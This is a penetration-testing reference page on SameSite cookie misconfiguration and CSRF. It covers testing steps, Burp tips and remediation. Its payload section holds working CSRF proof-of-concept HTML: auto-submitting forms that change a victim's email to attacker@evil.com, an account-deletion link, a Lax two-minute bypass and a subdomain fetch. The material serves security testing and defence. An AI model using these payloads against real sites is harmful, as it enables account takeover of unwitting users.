# SameSite Cookie Misconfiguration

## Overview
The `SameSite` cookie attribute is a defense-in-depth mechanism that instructs browsers to restrict when cookies are sent with cross-site requests. When misconfigured or absent, session cookies may be included in cross-site requests, enabling CSRF attacks even when no token-based protection exists. The three values — `Strict`, `Lax`, and `None` — each have different security tradeoffs, and choosing the wrong one (or omitting the attribute entirely) leaves the application exposed to CSRF. Browsers have progressively strengthened default SameSite behavior, but legacy applications and explicit `SameSite=None` configurations remain vulnerable.

## How It Works
- **`SameSite=None`**: Cookies are sent with all requests, including cross-site ones. Required for legitimate cross-site use (e.g., OAuth, embedded widgets, payment iframes) but enables CSRF. Must be paired with `Secure` (HTTPS-only) per modern browser requirements.
- **`SameSite=Lax`**: Cookies are sent with same-site requests and top-level navigations using "safe" HTTP methods (GET). Cross-site POST/PUT/DELETE requests do not include the cookie. This is the browser default in modern Chrome/Edge, but GET-based CSRF on state-changing actions is still possible.
- **`SameSite=Strict`**: Cookies are only sent with same-site requests. No cross-site cookie sending at all — the strongest protection but can break legitimate cross-site navigation flows.
- **Missing attribute**: In older browsers, defaults to `None`; in modern Chrome 80+, defaults to `Lax` — but this default Lax has a 2-minute bypass window for POST via form submissions from top-level navigations.

## Impact
- Enables CSRF attacks when `SameSite=None` is set without justification
- `SameSite=Lax` permits GET-based CSRF for state-changing GET endpoints
- Chaining: if `Lax` default is in use, a top-level navigation CSRF within 2 minutes of cookie issuance may bypass it
- Session fixation potential in some SameSite=None configurations
- `SameSite=None` without `Secure` flag causes the cookie to be rejected by modern browsers (breaking functionality) or silently falling back to no restriction in older browsers

## Where to Look
- `Set-Cookie` response headers in all authentication responses
- Session cookies in login responses (`session=`, `PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `.ASPXAUTH`)
- Any cookies used for authentication or state management
- Third-party integrations that require `SameSite=None` (payment processors, OAuth providers, SSO flows)
- Applications that use GET requests for state changes (logout, delete, confirm, etc.)
- APIs that rely solely on cookie authentication without token-based CSRF protection

## Testing Steps
1. Log in to the application and inspect the `Set-Cookie` response header(s) in Burp.
2. Check the `SameSite` attribute of each authentication cookie.
3. If `SameSite=None`, verify whether `Secure` flag is also present.
4. If `SameSite` is absent, determine the browser's default behavior (modern browsers default to Lax, but older ones default to None).
5. Test for CSRF with a cross-site form submission PoC.
6. For `Lax`, test GET-based CSRF on any state-changing GET endpoints.
7. Test the 2-minute Lax window bypass: issue a fresh CSRF PoC shortly after the victim logs in (within ~2 minutes of cookie creation) using a top-level form POST to see if the cookie is included.
8. Verify whether `SameSite=None` is required by any legitimate functionality, or if it can be tightened.

## Payloads / Techniques

**Check SameSite setting with cURL:**
```bash
curl -si -X POST https://victim.com/login \
     -d 'username=test&password=test' | grep -i 'set-cookie'
# Look for: Set-Cookie: session=abc; SameSite=None; Secure
# Missing SameSite? Note which browser default applies
```

**Test cross-site POST CSRF (exploits `SameSite=None` or missing):**
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form method="POST" action="https://victim.com/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

**GET-based CSRF (exploits `SameSite=Lax` — safe method bypass):**
```html
<!-- Top-level navigation via link click or window.location -->
<script>
window.location = 'https://victim.com/account/delete?confirm=true';
</script>
```
Or:
```html
<a href="https://victim.com/account/delete?confirm=true">Click for prize</a>
```

**SameSite=Lax 2-minute bypass via top-level POST navigation:**
```html
<!-- Triggers a top-level navigation POST, which Lax permits within ~2 minutes of cookie issuance -->
<form method="POST" action="https://victim.com/account/change-email" id="f">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
// Works only if victim just logged in (within ~2 min)
// and the browser treats this top-level navigation as "safe"
document.getElementById('f').submit();
</script>
```

**Testing SameSite=None without Secure (browser behavior):**
```bash
# Try HTTP request:
curl -si http://victim.com/login \
     -d 'username=test&password=test' | grep -i 'set-cookie'
# SameSite=None without Secure is rejected by Chrome/Firefox — may break auth
```

**Subdomain SameSite bypass (if XSS exists on a subdomain):**
```html
<!-- Hosted on subdomain.victim.com — SameSite=Lax sends cookies to victim.com -->
<script>
fetch('https://victim.com/account/update', {
  method: 'POST',
  credentials: 'include',
  body: 'email=attacker@evil.com'
});
</script>
```

## Burp Suite Tips
- In **Proxy HTTP history**, use the Search feature with the filter "Cookie attributes" or search response headers for `SameSite` to inventory all session cookies and their attributes.
- Use **Burp's Scanner** (Pro) — it automatically checks for missing SameSite attributes on authentication cookies.
- In **Repeater**, modify cookie values and observe whether cross-origin requests include them (you can simulate this by manually crafting cross-origin requests).
- Use **Burp's browser** with different origin settings to observe what cookies are sent cross-site.
- The **Cookie Analysis** feature in Burp (right-click cookie in response → Analyze cookie) will flag missing security attributes including SameSite.
- Use **Logger++** to monitor cookie headers across many requests and identify inconsistencies.

## Tools
- Burp Suite Pro (Scanner, Cookie Analysis)
- Browser DevTools (Application > Cookies — shows SameSite attribute)
- Cookie Editor browser extension (to manually inspect and modify cookies)
- OWASP ZAP (active scan checks SameSite)
- Caido
- curl (header inspection)
- Security Headers scanner — https://securityheaders.com

## Remediation
- **Set `SameSite=Lax` as minimum**: For most applications, `SameSite=Lax` is the appropriate default — it prevents POST-based CSRF while allowing normal navigation.
- **Prefer `SameSite=Strict`**: For high-security applications (banking, admin panels) where cross-site navigation starting points don't need to carry authentication, use `Strict`.
- **`SameSite=None` requires justification**: Only use `None` when the cookie genuinely needs to be sent in cross-site embedded contexts (payment iframes, OAuth flows). Pair with `Secure` flag, CSRF tokens, and CORS restrictions.
- **Combine with CSRF tokens**: SameSite is not a complete CSRF solution — supplement with synchronizer tokens for defense in depth, particularly for `Lax` configurations.
- **Eliminate GET-based state changes**: Never use GET requests for state-changing operations — reserve GET for idempotent reads only.
- **Set cookie attributes explicitly**: Don't rely on browser defaults; always explicitly set `SameSite`, `Secure`, `HttpOnly`, and `Path` on session cookies.
- **Framework configuration**: In Django, use `SESSION_COOKIE_SAMESITE = 'Lax'`. In Rails, use `config.action_dispatch.cookies_same_site_protection`. In Spring, configure via `CookieCsrfTokenRepository`.

## References
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies
https://web.dev/samesite-cookies-explained/
https://owasp.org/www-community/SameSite
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
